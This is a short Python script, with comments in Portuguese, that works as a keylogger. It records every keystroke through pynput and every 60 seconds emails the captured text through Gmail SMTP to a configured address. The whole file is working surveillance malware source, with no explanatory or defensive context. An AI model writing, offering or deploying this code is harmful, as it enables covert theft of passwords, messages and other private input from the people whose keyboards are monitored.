from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#configurar email

EMAIL_ORIGEM = "Origem@gmail.com"
EMAIL_DESTINO = "DESTINO@Gmail.com"
SENHA_EMAIL = "SENHA"


def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "DADOS ENVIADOS"
        msg['To']= EMAIL_DESTINO
        msg['FROM'] = EMAIL_ORIGEM
        try: 
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit
        except Exception as e:
            print('ERROR: ', e)
        log = ""
    #agendando
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.tab:
                log += "\t"
            elif key == keyboard.Key.esc:
                log += "  [ESC]  "
            elif key == keyboard.Key.backspace:
                log += "[<]"
            else:
                pass
        

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
